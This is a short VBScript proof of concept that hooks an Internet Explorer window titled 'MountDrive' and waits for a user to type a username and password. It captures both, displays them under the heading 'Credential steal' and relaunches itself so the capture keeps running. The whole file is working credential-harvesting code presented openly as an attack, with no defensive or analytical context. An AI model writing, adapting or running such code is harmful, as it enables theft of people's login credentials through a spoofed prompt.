
Set WshShell = CreateObject("WScript.Shell")
set fso=CreateObject("Scripting.FileSystemObject")
set f=fso.GetFile(Wscript.scriptfullname)

Dim IE, objectFound,credFound,sUser,sPasswd
objectFound = false
credFound = false

'First stage, retrieve Internet Explorer object'
On Error Resume Next
Do
  WScript.Sleep(10)
  call GetIE("MountDrive")    
  Err.Clear
Loop While objectFound = false
WScript.Sleep(10)

'Second stage, wait until user enter credential and hit OK buton'
Do
  WScript.Sleep(1)
  If Err.Number <> 0 Then ' User clicked red X (or Alt+F4) to close IE window
    msgbox "Error : " & Err.Number
    exit do
  elseIf IE.Document.all.OK.value = 1 Then '13 ou 15'
    sUser = Trim(IE.Document.all.Username.value)
    sPasswd = Trim(IE.Document.all.Password.value) '11'
    credFound = true
  End If
Loop While credFound = false
wscript.Sleep(10)
WshShell.Run "wscript " & f
On Error Goto 0

'Show stage'
If credFound = true Then
  If Not ((sUser = "") Or (sPasswd = ""))Then
    msgbox "Credential steal :" & vbcrlf & "USER : " & sUser & vbcrlf & "PASSWORD : " & sPasswd
  End If
End If

Sub GetIE(winTitle)
  Dim objInstances, objIE
  Set objInstances = CreateObject("Shell.Application").windows
  If objInstances.Count > 0 Then '/// make sure we have instances open.
    For Each objIE In objInstances
      If InStr(objIE.Name,"Internet Explorer") Then
        If InStr(objIE.FullName, "Internet") Then
          If InStr(objIE.Document.title,winTitle) Then
            Set IE = objIE
            objectFound = true
          End If
        End If
      End If
    Next
  End if
End Sub
